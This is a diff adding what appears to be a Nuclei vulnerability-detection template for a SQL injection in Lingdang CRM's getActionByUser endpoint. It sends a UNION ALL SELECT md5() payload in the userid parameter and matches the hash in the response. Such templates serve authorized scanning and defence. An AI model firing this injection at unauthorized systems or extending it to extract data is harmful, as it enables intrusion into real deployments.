@@ -1,0 +1,32 @@
+id: poc-yaml-51mis-crm-getactionbyuser-userid-sqli
+info:
+  name: Lingdang CRM getActionByUser userid SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: Lingdang CRM
+    fingerprint: "crmcommon/js/jquery/jquery-1.10.1.min.js"
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/crm/WeiXinApp/marketing/index.php?module=Users&action=getActionByUser&userid=1+UNION+ALL+SELECT+md5({{t1}}),NULL,NULL,NULL,NULL--+-&wx_user_id=1&keyWords=&page="
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"curpagenum\""
+          - "\"totalrows\""
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
